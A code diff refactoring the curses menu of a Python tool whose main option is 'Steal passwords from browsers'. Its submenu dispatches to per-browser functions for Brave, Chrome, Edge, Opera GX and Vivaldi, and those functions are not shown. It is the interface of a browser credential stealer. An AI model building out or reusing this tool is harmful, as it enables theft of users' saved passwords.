@@ -31,7 +31,7 @@ from utils.ansiColors import RED, RESET
 os.system('cls' if os.name == 'nt' else 'clear')
 
 def showLogo(screen):
-    logo = """
+    logo = r"""
      ⠀⠀⠀⢀⣴⣿⣿⣿⣦
      ⠀⠀⣰⣿⡟⢻⣿⡟⢻⣧        ____  __           __   _____ __              __              
     ⠀⠀⣰⣿⣿⣇⣸⣿⣇⣸⣿       / __ )/ /___ ______/ /__/ ___// /_  ____ _____/ /_____      __
@@ -60,6 +60,7 @@ def displayMenu(screen, options, currentOption, title):
         else:
             screen.addstr(displayIdx, 5, f"  {description}")
     screen.refresh()
+
 def handleInput(key, currentOption, options):
     if key == curses.KEY_UP:
         currentOption = (currentOption - 1) % len(options)
@@ -70,6 +71,7 @@ def handleInput(key, currentOption, options):
     elif key == 27:
         return '0', currentOption
     return None, currentOption
+
 def mainMenuControl():
     options = [
         ("1", "Steal passwords from browsers"),
@@ -87,6 +89,7 @@ def mainMenuControl():
 
     curses.wrapper(menuLogic)
     return selectedOption
+
 def submenuBrowsers():
     options = [
         ("1", "Brave"),
@@ -109,25 +112,33 @@ def submenuBrowsers():
     return selectedOption
 
 def main():
+    browser_functions = {
+        '1': getPasswordsBrave,
+        '2': getPasswordsChrome,
+        '3': getPasswordsEdge,
+        '4': getPasswordsOperaGX,
+        '5': getPasswordsVivaldi
+    }
+
     while True:
         choice = mainMenuControl()
         if choice == '1':
-            subchoice = submenuBrowsers()
-            try:
-                if subchoice == '1':
-                    getPasswordsBrave()
-                elif subchoice == '2':
-                    getPasswordsChrome()
-                elif subchoice == '3':
-                    getPasswordsEdge()
-                elif subchoice == '4':
-                    getPasswordsOperaGX()
-                elif subchoice == '5':
-                    getPasswordsVivaldi()
-                elif subchoice == '0':
-                    main()
-            except Exception as e:
-                print(f"{RED}Ocorreu um erro: {e}{RESET}")
+            while True:
+                subchoice = submenuBrowsers()
+                if subchoice == '0':
+                    break
+
+                func = browser_functions.get(subchoice)
+                if func:
+                    try:
+                        func()
+                    except Exception as e:
+                        print(f"{RED}Ocorreu um erro: {e}{RESET}")
+                else:
+                    print(f"{RED}Opção inválida!{RESET}")
+
+                input("Pressione Enter para continuar...")
+                os.system('cls' if os.name == 'nt' else 'clear')
         elif choice == '0':
             exit()
 
